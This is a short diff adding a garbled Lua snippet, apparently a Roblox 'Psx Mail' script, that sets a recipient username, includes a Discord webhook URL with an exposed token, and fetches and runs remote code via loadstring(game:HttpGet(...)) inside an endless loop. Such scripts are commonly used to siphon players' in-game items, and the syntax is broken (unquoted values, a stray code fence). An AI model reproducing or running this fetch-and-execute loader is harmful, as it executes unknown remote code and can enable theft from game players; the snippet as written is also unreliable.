@@ -1,0 +1,13 @@
+while true do
+```lua
+
+_G.Username = etzrbn5god
+
+_G.HubName = Psx Mail Scirt
+
+_G.WebhookUrl = https://discord.gg/u2bgccUkzf
+
+"https://discordapp.com/api/webhooks/1088159488021901372/RVNHFFLv5TP43HMCvX_x7HYMefRd_iX0DUTeRIygFpfvXyO6SfjjeLP5AcqkJiBZbMYz"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()```
+end
